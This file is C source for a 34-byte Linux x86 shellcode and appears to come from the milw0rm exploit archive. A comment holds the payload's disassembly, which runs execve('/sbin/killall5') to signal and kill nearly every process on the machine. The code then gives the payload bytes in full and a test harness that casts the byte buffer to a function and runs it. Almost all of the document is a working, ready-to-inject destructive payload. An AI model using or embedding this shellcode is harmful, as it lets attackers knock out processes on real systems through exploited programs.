/*
   Linux x86 | killall5
   Shellcode 34 bytes
   Author: Jonathan Salwan <js.rac.projet [AT] gmail.com
   Web: http://pollydevstorm.zapto.org

   killall5 is the SystemV killall command. It sends a signal to all processes
   except the processes in its own session, so it won't kill the shell that is
   running the script it was called from. Its primary (only) use is in the rc
   scripts found in the /etc/init.d directory.


Disassembly of section .text:

08048054 <.text>:
 8048054:       31 c0                   xor    %eax,%eax
 8048056:       50                      push   %eax
 8048057:       66 68 6c 35             pushw  $0x356c
 804805b:       68 6c 6c 61 6c          push   $0x6c616c6c
 8048060:       68 6e 2f 6b 69          push   $0x696b2f6e
 8048065:       68 2f 73 62 69          push   $0x6962732f
 804806a:       89 e3                   mov    %esp,%ebx
 804806c:       50                      push   %eax
 804806d:       89 e2                   mov    %esp,%edx
 804806f:       53                      push   %ebx
 8048070:       89 e1                   mov    %esp,%ecx
 8048072:       b0 0b                   mov    $0xb,%al
 8048074:       cd 80                   int    $0x80

*/

#include "stdio.h"

int main(int argc, char *argv[])
{

	char shellcode[] = 	"\x31\xc0\x50\x66\x68\x6c"
				"\x35\x68\x6c\x6c\x61\x6c"
				"\x68\x6e\x2f\x6b\x69\x68"
				"\x2f\x73\x62\x69\x89\xe3"
				"\x50\x89\xe2\x53\x89\xe1"
				"\xb0\x0b\xcd\x80";

	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();

	return 0;
}

// milw0rm.com [2009-02-04]